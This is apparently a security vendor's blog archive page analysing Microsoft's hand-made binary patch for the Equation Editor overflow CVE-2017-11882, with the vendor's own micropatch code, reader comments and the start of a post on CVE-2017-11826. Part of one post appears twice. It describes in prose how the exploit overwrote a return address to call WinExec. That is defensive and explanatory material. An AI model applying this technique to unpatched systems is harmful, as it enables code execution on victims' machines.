As shown on the above image, a check is injected before the inlined memcpy code. Note that in 32-bit code, memcpy is typically implemented by first copying blocks of 4 bytes using the movsd (move double word) instruction, while any remaining bytes are then copied using movsb (move byte). This is efficient in terms of performance, but whoever was patching this noticed that some space can be freed by only using movsb, and perhaps sacrificing a nanosecond or two. After doing so, the code remained logically identical but now there was space for injecting the check before it, as well as for zero-terminating the copied string. Again, an impressive and clever hack (and there was still an extra byte to spare - notice the nop?)

There are six such length checks in two modified functions, and just one of them is directly responsible for blocking Embedi's exploit. We believe that Microsoft noticed some additional attack vectors that could also cause a buffer overflow and decided to proactively patch the other five memcpys and the patched function we covered earlier.

**Final Touches**

After patching the vulnerable code and effectively manually building a new version of Equation Editor, the patcher also corrected the version number of EQNEDT32.EXE to 2017.8.14.0, and the *TimeDateStamp* in the PE header to August 14, 2017 (hex value 5991FA38) - which is just 10 days after Microsoft acknowledged receipt of Embedi's report. (Note however that due to the manual nature of setting these values it's possible that code has been modified after that date.)

[Update 11/20/2017] Another thing Microsoft also patched in EQNEDT32.EXE was the "ASLR bit", i.e., they set the IMAGE\_DLLCHARACTERISTICS\_DYNAMIC\_BASE flag in the [PE optional header structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339%28v%3Dvs.85%29.aspx):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s640/ASLR.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s1600/ASLR.png)

This is good. Enabling ASLR on EQNEDT32.EXE will make it harder to exploit any remaining memory corruption vulnerabilities. For instance, Embedi's exploit would not work with ASLR because it relied on the fact that the call to WinExec would always be present at the same memory address; this allowed them to simply put that address on stack and wait for the ret to do all the work.

Interestingly, Microsoft decided not to also set the IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT ("DEP") flag, which would prevent code execution from data pages (e.g., from stack). They surely had good reasons, but should any additional vulnerabilities be found and exploited in EQNEDT32.EXE, the exploit will likely include execution of data on stack or heap. [End update 11/20/2017]

**Conclusion**

Maintaining a software product in its binary form instead of rebuilding it from modified source code is hard. We can only speculate as to why Microsoft used the binary patching approach, but being binary patchers ourselves we think they did a stellar job.

This old Equation Editor is now under the spotlight, and many researchers are likely to start fuzzing it for additional vulnerabilities. If any are found, we'll probably see additional rounds of manual binary patches in EQNEDT32.EXE. While Office has had a new Equation Editor integrated since at least version 2007, Microsoft can't simply remove EQNEDT32.EXE (the old Equation Editor) from Office as there are probably tons of old documents out there containing equations in this old format, which would then become un-editable.

Now how would we micropatch CVE-2017-11882 with 0patch? It would actually be much easier: we wouldn't have to shrink existing code to make room for the injected one, because 0patch makes sure that we get all the space we need. So we wouldn't have to come up with clever hacks like de-optimizing memcpy or finding an alternative place to temporarily store a value for later use. This freedom and flexibility makes developing an in-memory micropatch much easier and quicker than in-file patching, and we believe software vendors like Microsoft could benefit greatly from using in-memory micropatching for fixing critical vulnerabilities.

Oh by the way, Microsoft also updated Office's wwlib.dll this Patch Tuesday, prompting us to port our [DDE / DDEAUTO patches](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) to these new versions. 0patch Agent running on your computer will automatically download and apply these new patches without interrupting you. If you don't have 0patch Agent installed yet, we have good news for you: IT'S FREE! Just [download](http://0patch.com/download.htm), install and register, and you're all set.

Cheers!

     This is the most obvious and probably the real reason. 17 year old source code got lost... God knows, maybe they were not even using a source code version control system back then.

     Either this or they know how long their builds take. Maybe a very long time. I think also other files would be touched with a re-compile from source. Throw OEM and alternate language versions in. If more than 100 versions then it's clear why. If it's just 5 or 6 versions maybe different. Surely this saves a recompile on somewhere between 24 and 75 builds of the same software. Saves on bandwidth too, maybe they want to get this out quick and deep = small file gets in quicker.

   Having the patched version on the left has lately become a habit to us (often diffing the latest version with multiple older versions so primary stays open). But wondering, is there some consensus on this in the community?

     I haven't heard of any consensus (or seen the question asked before). I typically do Old Left - New Right so i can see what was present when I started and what changes I've made.
     When doing a merge I'll put my changes on the left with the new file on the right when comparing so the destination is on the right.

     That said: without looking it up I don't know how I diff current vs past revisions. (Verifying it I do have past on left with current would be on right)

     Although it sounds logical to have the newer versions to the right like in a timeline, it's more "natural?" to have the newer on the left and the older on the right :D Dunno, I got a strange feeling about that :D

     ditto the above, it's like reading left to right, like an x-axis timeline increasing from left to right. Seems a reasonable request.

   The copyright tag in the first screenshot is interesting. Who are "Design Science, Inc."? Perhaps that's why Microsoft doesn't have the source?

   Equation Editor was written bu a third party vendor (Design Science). Most probably MS did not have the source code.

     Design Science continued development of this product into their fully featured MathType software

     That's not correct: MathType has been around for a long time: first on the Mac, and then on Windows 2. Microsoft licensed a scaled-down version of MathType, called Equation Editor, for inclusion with some of its products on both Windows and Macintosh.

    feh - we were doing this for mfc40.dll and y2k 18 years ago. https://jeffpar.github.io/kbarchive/kb/231/Q231327/

    And yes the nop [eax+eax] is a 0F 1F NOP that don't work on older CPUs.

    Reported a bug to MS in GDI+ Image.Save() about 2 years ago, which is present from XP to Win10. Some encoders do not report an error if write operations fail (e.g. out of disk space) and generate invalid files. MS offered 3 different approaches, how to work around this problem, but refused to accept this being a bug. I got the impression, that they don't want to touch old code. After a lot of arguing (maybe 10 emails) they finally accepted it being a bug. Maybe they are scared that a rebuild with a current tool chain may cause strange side effects. Maybe the old code base contains "dirty tricks", that would cause issues with current tools.

      I'm pretty sure that a company like Microsoft, does not only keep old sources, but also the relevant tool chains, target OSes (to build and test upon). Otherwise things would be pretty futile and indeed dangerous.

      That doesn't mean, of course, that they are reluctant to change old software - every little change could introduce a compatibility issue on the other end.

    Technically, Microsoft could just have a replicable build toolchain. This is a thing in safety critical computing, where you should be able to recreate binaries bit-for-bit; usually this means version controlling the source code together with the entire toolchain.

    MS had source code (or Design Science compiled it for them) at least as far as around 2005, since different build comes with Office 2007 and file is dated 10/04/2005 (also TimeDateStamp in both builds correspond to file modification date). For whatever reason they reverted to older builds since Office 2010 I think.

    Besides recompilation I see no other differences, version numbers are the same, copyright date is the same etc.

    Discovered that while updating manually Equation Editor on various PCs with different Office versions.

    TL&DR; Office 2007 had different version of Equation Editor built in 2005.

    I was an engineer at Microsoft working on compatibility fixes and did a lot of these patches. You are very often better off making a very specific tweak to older codebases rather than doing a full build. Minor changes to compilers, other tools, etc are an issue, but the big one is recreating the full test suite for older apps. Doing a professional job releasing software that could be in use by millions of people is a HUGE endeavor to do properly.

### [Microsoft's Manual Binary Patch For CVE-2017-11882 Meets 0patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)

by Luka Treiber, the 0patch Team

Last Monday evening Embedi published the [PoC](https://github.com/embedi/CVE-2017-11882) referred to in their [report](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about) and on Tuesday we released a micropatch for the vulnerability. Here is the analysis.

The PoC is in form of an RTF file that, if opened in Microsoft Word, immediately pops up calc.exe. To accomplish this, Embedi overflowed a string buffer on the stack with an overlong font name applied to an equation text.

As shown in their [WinDbg screenshot](https://embedi.com/files/blog/word/word-11.png), the overlong font name contains a command string to be executed followed by padding A's until a trailing return address to a WinExec call at offset 2Ch that is supposed to execute the command string. Apparently the WinExec call address, located at font string offset that is already out of bounds of the designated buffer, replaces a legitimate return address on stack so when the vulnerable function returns, the payload gets executed instead.

What was Microsoft's official patch? As already said in [our previous post](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html), the [diff](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG) of EqnEdt32.exe between versions 2017.8.14.0 and 2000.11.9.0 showed only 5 modified functions. Running the PoC with WinDbg attached showed that it executes one of the patched functions, sub\_0041160F. There were 5 changed blocks of code in that function, but it turns out the relevant patch that blocks the PoC is the topmost one.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s640/diff1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s1600/diff1.png)

This patch consists of an added boundary check (top square on the left) and buffer truncation code (bottom square on the left)  to a vulnerable memcpy operation that overwrote a stack buffer as previously mentioned. The conditional is placed after counting bytes to be copied from arg\_0 to var\_28 and makes sure that if the source string is too long, only 0x20 bytes are copied and zero-terminated.

However, this is not the biggest difference applied to the vulnerable code block. The most code reorganization and, we believe, effort had to be put into the middle square where the developer replaced the compiler's memcpy implementation on the right with a more compressed alternative to gain space for injecting the aforementioned security check.

Based on all these findings we wrote our own micropatch:

; CVE-2017-11882 patch for Equation Editor EQNEDT32.EXE 2000.11.9.0
MODULE\_PATH "C:\Analysis\CVE-2017-11882\EQNEDT32.EXE"
PATCH\_ID 313
PATCH\_FORMAT\_VER 2
VULN\_ID 3084
PLATFORM win32

 PATCHLET\_ID 1
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x0001164C

 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x00011661

 code\_start

  xor eax, eax
  stosb ; zero-terminate the string

 code\_end

patchlet\_end

With this micropatch we did the same thing as Microsoft, only we had no hassle finding the space to inject our code. It is quite ingenious how they managed to compress the code around the patch offset in order to make room for the patch code that required additional 10 bytes. We too need space at the patch offset in order to inject a jmp to our micropatch, however, our technology takes care of automatically injecting these 5 bytes and relocating the original code somewhere else. There are certain requirements that the patch location has to meet (see our [0patch Developer Manual](https://0patch.com/dev_manual.htm) for details), but this is far less constraining than compacting code around the offset like Microsoft had to do.

Our micropatches for this vulnerability have been labeled ZP-313 and ZP-314 (there are two slightly different versions of EqnEdt32.exe) and cover all Microsoft Office versions from 2007 to 2016 and 365. As always, if you have 0patch Agent installed, these micropatches should already be present and applied on your system. If not, you can [download a free copy of 0patch Agent](http://0patch.com/download.htm) to protect your system from CVE-2017-11882.

(By the way, ZP-313 and ZP-314 have replaced the now-revoked micropatch for this issue we had released on Tuesday because we wanted to add the zero-termination code and thus fully mirror the official patch. In case you didn't know how micropatch revocation works, it's just as seamless as everything else: the revoked patch simply stops being applied, and the new one starts getting applied instead. Again, users don't notice anything.)

It was a surprising and an interesting revelation that official software vendors/maintainers also occasionally resort to manual binary patching. Moreover, our analysis of the official patch has shown that in such cases it is harder to directly patch the binary than to use in-memory micropatching. Lastly it may even turn out to be infeasible to patch some bugs in binary files because the code may already be fully optimized for space and the technique seen in Microsoft's CVE-2017-11882 patch would require and unacceptable amount of effort. In cases like that micropatching can turn out to be more agile than traditional patching.

This being said, all that remains is the pleasure of presenting a video of our agile micropatch in action :)

### [Did Microsoft Just Manually Patch Their Equation Editor Executable? Why Yes, Yes They Did. (CVE-2017-11882)](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html)

**And They Did an Absolutely Stellar Job**

by Mitja Kolsek, the 0patch Team

[Update 11/21/2017]  Today Embedi published [their proof-of-concept exploit](https://github.com/embedi/CVE-2017-11882), which allowed us to see where exactly Microsoft's manual patch blocks it. Contrary to this article's original claim that CVE-2017-11882 was patched in function 4164FA while six other buffer overflow checks we found were for some other attack vectors, it is actually one of those six checks that blocks Embedi's exploit. This article has been slightly corrected to reflect that. In addition, we were now able to create a micropatch for Equation Editor that also blocks all exploits targeting the vulnerability found by Embedi. All Internet-connected computers with a registered 0patch Agent running have already received this micropatch and have it automatically applied whenever Equation Editor is launched. [End update 11/21/2017]

**A Pretty Old Executable**

The recent Patch Tuesday brought, among other things, a new version of "old" Equation Editor, which introduced a [fix for a buffer overflow issue](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) reported by [Embedi](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).

The "old" Equation Editor is an *ancient* component of Microsoft Office (Office now uses an integrated Equation Editor), which is confirmed by looking at the properties of the unpatched EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s640/Equation_editor_properties.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s1600/Equation_editor_properties.png)

We can see that *File version* is 2000.11.9.0 (implying being built in 2000), while *Date modified* is in 2003, which matches the time of its signature (signing modifies the file as the signature is attached to it.) Furthermore, the [*TimeDateStamp* in its PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v%3Dvs.85%29.aspx) (3A0ACEBF),
which the compiler writes into the executable module when building it,
indicates that the file was built on November 9, 2000 - exactly matching
the date in the above version number.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s640/Equation_editor_timestamp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s1600/Equation_editor_timestamp.png)

We're therefore safe to claim that the vulnerable EQNEDT32.EXE has been with us since 2000. That's 17 years, which is a pretty respectable life span for software!

So now a vulnerability was reported in this executable and Microsoft spawned their fixing procedure: they reproduced the issue using Embedi's proof-of-concept, confirmed it, took the source code, fixed the issue in the source code, re-built EQNEDT32.EXE, and distributed the fixed version to Office users, who now see version 2017.8.14.0 under its properties.

At least that's how it *would* work for most other vulnerabilities. But something was different here. For some reason, Microsoft didn't fix this issue in the source code - but rather by manually patching the binary executable.

**Manually Patching an EXE?**

Really, quite literally, some pretty skilled Microsoft employee or contractor reverse engineered our friend EQNEDT32.EXE, located the flawed code, and corrected it by manually overwriting existing instructions with better ones (making sure to only use the space previously occupied by original instructions).

How do we know that? Well, have you ever met a C/C++ compiler that would put all functions in a 500+ KB executable on **exactly the same address in the module** after rebuilding a modified source code, especially when these modifications changed the amount of code in several functions?

To clarify, let's look at BinDiff results between the fixed (2017.8.14.0, "primary") and vulnerable version (2000.11.9.0, "secondary") of EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s1600/Equation_Editor_diff_matched_functions.PNG)

If you're diffing binaries a lot, you'll notice something highly peculiar: All *EA primary* values are identical to *EA secondary* values of matched functions. Even the matched but obviously different functions listed at the bottom are at the same address in both EQNEDT32.EXE versions.

As we already [noted on Twitter](https://twitter.com/0patch/status/930803478930345984), Microsoft modified five functions in EQNEDT32.EXE, namely the bottom-most five functions listed on the above image. Let's look at the most-modified one first, the one at address 4164FA. The patched version is on the left, the vulnerable one on the right.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s640/Equation_Editor_diff_patched_function.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s1600/Equation_Editor_diff_patched_function.PNG)

This function takes a pointer to the destination buffer and copies characters, one by one in a loop, from user-supplied string to this buffer. It is also the very function that Embedi found to be vulnerable in their research; namely, there was no check whether the destination buffer was large enough for the user-supplied string, and a too-long font name provided through the Equation object could cause a buffer overflow.

Microsoft's fix introduced an additional parameter to this function, specifying the destination buffer length. The original logic of the character-copying loop was then modified so that the loop ends not only when the source string end is reached, but also when the destination buffer length is reached - preventing buffer overflow. In addition, the copied string in the destination buffer is zero-terminated after copying, in case the destination buffer length was reached (which would leave the string unterminated).

Let's look at the code in its text form (again, patched function on left, vulnerable on right):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s640/Patched_function_code_diff.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s1600/Patched_function_code_diff.png)
As you can see, whoever patched this function not only added a check for buffer length in it, but also managed to make the function 14 bytes shorter (and padded the resulting gap before the adjacent function with 0xCC bytes for style points :). Impressive.

**Patching The Callers**

Moving on. If the patched function got an additional parameter, all those calling it would have to change as well, right? There are exactly two callers of this function, at addresses 43B418 and 4181FA, and in the patched version they both have a push instruction added before the call to specify the length of their buffers, 0x100 and 0x1F4 respectively.

Now, a push instruction with a 32-bit literal operand takes 5 bytes. In order to add this instruction to these two functions while staying within the tight space of the original code (whose logic must also remain intact), thepatcher did the following:

For function at address 43B418, the patched function temporarily stores some value - which it will need later on - in ebx instead of a local stack-based variable, which releases enough bytes for injecting the push call. (By the way, additional evidence of manual patching is that while the local variable is no longer used, space for it is still made on the stack; otherwise sub esp, 0x10C would turn into sub esp, 0x108.)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s640/Equation_Editor_diff_43B418.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s1600/Equation_Editor_diff_43B418.PNG)

For the other caller, function at address 4181FA, the patched function mysteriously has the push instruction injected without any other modifications to the code that would introduce the needed extra space.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s640/Equation_Editor_diff_4181FA.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s1600/Equation_Editor_diff_4181FA.PNG)

As you can see on the above image, the push instruction is injected at the beginning of the yellow block, and all original instructions in that block are pushed down 5 bytes. But why does this not overwrite 5 bytes of the original code somewhere else? It's as if there were 5 or more unused bytes already in existence just after this block of code that the patcher could safely overwrite.

To solve this mystery, let's look at the code in its text form.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s640/4181FA_code_diff.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s1600/4181FA_code_diff.PNG)

Surprise, the vulnerable version actually had an extra jmp loc\_418318 instruction at the end of the modified code block. How convenient! This allows the code in this block to be moved down 5 bytes, making space for the push instruction at the top.

Coincidence? Perhaps, but it looks an awful lot like this code block got manually modified before in the past, whereby it got shortened for 5 bytes and its last instruction (jmp loc\_418318) was left there.

**Additional Security Checks**

What we've covered so far was related to Embedi's published research and CVE-2017-11882, but is *not* what blocks Embedi's exploit. The new version of EQNEDT32.EXE has two additional modified functions at addresses 41160F and 4219F0. Let's have a look at them.

In the patched executable, these two functions got a bunch of injected boundary checks for copying to what appear to be 0x20-byte buffers. These checks all look the same: ecx (which is the counter for copying) is compared to 0x21; if it's greater than or equal to that, ecx gets set to 0x20. All these checks are injected right before inlined memcpy operations. Let's look at one of them to see how the patcher made room for the additional instructions.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s640/Equation_Editor_diff_41160F.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s1600/Equation_Editor_diff_41160F.PNG)

As shown on the above image, a check is injected before the inlined memcpy code. Note that in 32-bit code, memcpy is typically implemented by first copying blocks of 4 bytes using the movsd (move double word) instruction, while any remaining bytes are then copied using movsb (move byte). This is efficient in terms of performance, but whoever was patching this noticed that some space can be freed by only using movsb, and perhaps sacrificing a nanosecond or two. After doing so, the code remained logically identical but now there was space for injecting the check before it, as well as for zero-terminating the copied string. Again, an impressive and clever hack (and there was still an extra byte to spare - notice the nop?)

There are six such length checks in two modified functions, and just one of them is directly responsible for blocking Embedi's exploit. We believe that Microsoft noticed some additional attack vectors that could also cause a buffer overflow and decided to proactively patch the other five memcpys and the patched function we covered earlier.

**Final Touches**

After patching the vulnerable code and effectively manually building a new version of Equation Editor, the patcher also corrected the version number of EQNEDT32.EXE to 2017.8.14.0, and the *TimeDateStamp* in the PE header to August 14, 2017 (hex value 5991FA38) - which is just 10 days after Microsoft acknowledged receipt of Embedi's report. (Note however that due to the manual nature of setting these values it's possible that code has been modified after that date.)

[Update 11/20/2017] Another thing Microsoft also patched in EQNEDT32.EXE was the "ASLR bit", i.e., they set the IMAGE\_DLLCHARACTERISTICS\_DYNAMIC\_BASE flag in the [PE optional header structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339%28v%3Dvs.85%29.aspx):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s640/ASLR.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s1600/ASLR.png)

This is good. Enabling ASLR on EQNEDT32.EXE will make it harder to exploit any remaining memory corruption vulnerabilities. For instance, Embedi's exploit would not work with ASLR because it relied on the fact that the call to WinExec would always be present at the same memory address; this allowed them to simply put that address on stack and wait for the ret to do all the work.

Interestingly, Microsoft decided not to also set the IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT ("DEP") flag, which would prevent code execution from data pages (e.g., from stack). They surely had good reasons, but should any additional vulnerabilities be found and exploited in EQNEDT32.EXE, the exploit will likely include execution of data on stack or heap. [End update 11/20/2017]

**Conclusion**

Maintaining a software product in its binary form instead of rebuilding it from modified source code is hard. We can only speculate as to why Microsoft used the binary patching approach, but being binary patchers ourselves we think they did a stellar job.

This old Equation Editor is now under the spotlight, and many researchers are likely to start fuzzing it for additional vulnerabilities. If any are found, we'll probably see additional rounds of manual binary patches in EQNEDT32.EXE. While Office has had a new Equation Editor integrated since at least version 2007, Microsoft can't simply remove EQNEDT32.EXE (the old Equation Editor) from Office as there are probably tons of old documents out there containing equations in this old format, which would then become un-editable.

Now how would we micropatch CVE-2017-11882 with 0patch? It would actually be much easier: we wouldn't have to shrink existing code to make room for the injected one, because 0patch makes sure that we get all the space we need. So we wouldn't have to come up with clever hacks like de-optimizing memcpy or finding an alternative place to temporarily store a value for later use. This freedom and flexibility makes developing an in-memory micropatch much easier and quicker than in-file patching, and we believe software vendors like Microsoft could benefit greatly from using in-memory micropatching for fixing critical vulnerabilities.

Oh by the way, Microsoft also updated Office's wwlib.dll this Patch Tuesday, prompting us to port our [DDE / DDEAUTO patches](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) to these new versions. 0patch Agent running on your computer will automatically download and apply these new patches without interrupting you. If you don't have 0patch Agent installed yet, we have good news for you: IT'S FREE! Just [download](http://0patch.com/download.htm), install and register, and you're all set.

Cheers!

### [0patching a Pretty Nasty Microsoft Word Type Confusion Vulnerability (CVE-2017-11826)](https://blog.0patch.com/2017/11/0patching-pretty-nasty-microsoft-word.html)

by Mitja Kolsek, the 0patch Team

In September 2017, [Qihoo 360 Core Security detected an in-the-wild attack](https://blog.360totalsecurity.com/en/new-office-0day-cve-2017-11826/) that leveraged an Office 0day vulnerability now known as CVE-2017-11826. The attack employed an RTF document with embedded DOCX Word documents, whereby one of them exploited the vulnerability to cause type confusion in the OOXML parser, Microsoft's parser for Office Open XML File Formats. Additional noteworthy analyses of this vulnerability subsequently came from [McAfee](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-microsoft-office-zero-day-exploit-cve-2017-11826-memory-corruption-vulnerability/) and [Kaspersky](https://securelist.com/analyzing-an-exploit-for-%D1%81ve-2017-11826/82869/).

Yang Kang, Ding Maoyin and Song Shenlei of Qihoo 360 Core Security reported this issue to Microsoft, which fixed it in their [October security update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11826).

This vulnerability is particularly easy to exploit, as it only requires the user to open a malicious RTF document in Word (which is the default RTF editor when installed), and isn't mitigated by Word's Protected View. It is actually surprising that it's not getting exploited more widely, as attackers know very well that many organizations need [weeks or months to apply software updates](https://blog.0patch.com/2016/01/bridging-security-update-gap-with-0patch.html).

